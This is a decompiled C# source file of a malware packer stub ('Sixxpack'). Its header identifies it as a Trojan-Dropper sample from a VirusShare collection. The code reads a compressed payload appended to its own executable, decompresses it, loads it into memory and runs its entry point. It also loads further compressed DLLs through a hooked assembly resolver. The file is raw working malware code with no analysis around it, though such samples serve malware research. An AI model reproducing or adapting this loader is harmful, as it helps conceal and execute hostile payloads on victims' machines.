// Decompiled with JetBrains decompiler
// Type: Sixxpack.stub
// Assembly: actmp, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 50C41484-D1A9-4872-9CEC-A8081495D24E
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00001-msil\Trojan-Dropper.MSIL.Late.jc-6e02b71a709e42516d7a14e4e52d08479b8d86674e6e6992da3654142ae73613.exe

using System;
using System.IO;
using System.Reflection;
using System.Windows.Forms;

namespace Sixxpack
{
  internal class stub
  {
    internal static int orig = 45056;

    [STAThread]
    private static void Main(string[] args)
    {
      try
      {
        AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(stub.myResolveEventHandler);
      }
      catch (Exception ex)
      {
      }
      object[] parameters = new object[1]{ (object) args };
      MemoryStream inStream = new MemoryStream();
      Stream stream = (Stream) new FileStream(Application.ExecutablePath.Substring(Application.ExecutablePath.LastIndexOf('\\') + 1), FileMode.Open, FileAccess.Read);
      stream.Position = (long) stub.orig;
      byte[] buffer = new byte[stream.Length - (long) stub.orig];
      stream.Read(buffer, 0, Convert.ToInt32(buffer.Length));
      inStream.Write(buffer, 0, buffer.Length);
      inStream.Seek(0L, SeekOrigin.Begin);
      Assembly assembly = Assembly.Load(new Compressor().Decompress((Stream) inStream));
      try
      {
        assembly.EntryPoint.Invoke((object) null, parameters);
      }
      catch
      {
        assembly.EntryPoint.Invoke((object) null, (object[]) null);
      }
    }

    private static Assembly myResolveEventHandler(object sender, ResolveEventArgs args)
    {
      string str = args.Name.ToString().Trim().Split(',')[0].ToString().Trim();
      string path = str.IndexOf(".") < 0 ? "_" + str + ".dll" : str.Replace(".", "_") + ".dll";
      MemoryStream inStream = new MemoryStream();
      Stream stream = (Stream) new FileStream(path, FileMode.Open, FileAccess.Read);
      byte[] buffer = new byte[stream.Length];
      stream.Read(buffer, 0, Convert.ToInt32(buffer.Length));
      inStream.Write(buffer, 0, buffer.Length);
      inStream.Seek(0L, SeekOrigin.Begin);
      return Assembly.Load(new Compressor().Decompress((Stream) inStream));
    }
  }
}
